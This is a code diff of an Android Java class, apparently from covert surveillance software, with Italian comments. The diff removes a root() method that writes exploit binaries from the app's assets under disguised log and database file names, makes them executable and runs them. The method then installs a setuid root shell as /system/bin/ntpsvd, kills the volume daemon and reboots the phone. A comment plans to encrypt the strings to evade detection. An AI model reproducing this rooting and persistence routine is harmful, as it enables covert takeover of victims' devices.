@@ -326,7 +326,7 @@ public class Root {
 
 			return true;
 		} catch (Exception e) {
-			if (Cfg.EXP) {
+			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 
@@ -349,7 +349,7 @@ public class Root {
 
 			return true;
 		} catch (Exception e) {
-			if (Cfg.EXP) {
+			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 
@@ -468,117 +468,6 @@ public class Root {
 
 		return cis;
 	}
-
-	static public boolean root() {
-		try {
-			if (!Cfg.EXP) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
-				}
-
-				return false;
-			}
-
-			final String crashlog = M.e("errorlog"); //$NON-NLS-1$
-			final String exploit = M.e("statuslog"); //$NON-NLS-1$
-			final String suidext = M.e("statusdb"); //$NON-NLS-1$
-			boolean isRoot = false;
-
-			// Creiamo il crashlog
-			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
-			fos.close();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
-			}
-
-			// exploit
-			InputStream stream = Utils.getAssetStream("e.bin");
-
-			// "0x5A3D10448D7A912B"
-			Root.fileWrite(exploit, stream, Cfg.RNDLOG);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
-			}
-
-			// shell
-			stream = Utils.getAssetStream("s.bin");
-
-			// 0x5A3D10448D7A912A
-			Root.fileWrite(suidext, stream, Cfg.RNDDB);
-
-			// Eseguiamo l'exploit
-			final File filesPath = Status.getAppContext().getFilesDir();
-			final String path = filesPath.getAbsolutePath();
-
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(M.e("/system/bin/chmod 666 ") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
-
-			String exppath = path + "/" + exploit; //$NON-NLS-1$
-
-			ExploitRunnable r = new ExploitRunnable(exppath);
-			Thread t = new Thread(r);
-			if (Cfg.DEBUG) {
-				t.setName(r.getClass().getSimpleName());
-			}
-			t.start();
-
-			// Attendiamo al max 100 secondi il nostro file setuid root
-			final long now = System.currentTimeMillis();
-
-			while (System.currentTimeMillis() - now < 100 * 1000) {
-				Utils.sleep(1000);
-
-				if (PackageInfo.checkRoot()) {
-					isRoot = true;
-					break;
-				}
-			}
-
-			if (r.getProcess() != null) {
-				r.getProcess().destroy();
-			}
-
-			if (isRoot) {
-				// Di' a suidext di fare il kill di VOLD per due volte
-				Runtime.getRuntime().exec(path + "/" + suidext + M.e(" vol")); //$NON-NLS-1$ //$NON-NLS-2$
-
-				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
-				Runtime.getRuntime().exec(path + "/" + suidext + M.e(" rt")); //$NON-NLS-1$ //$NON-NLS-2$
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
-				}
-
-				// Riavviamo il telefono
-				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
-				}
-			}
-
-			return isRoot;
-
-		} catch (final Exception e1) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e1);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
-			}
-
-			return false;
-		}
-	}
-
-	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
-	// le stringe nella librunner.so. Fixare il fatto che l'app va
-	// in crash se la funzione torna 0 o 1 e si ferma il servizio
 
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
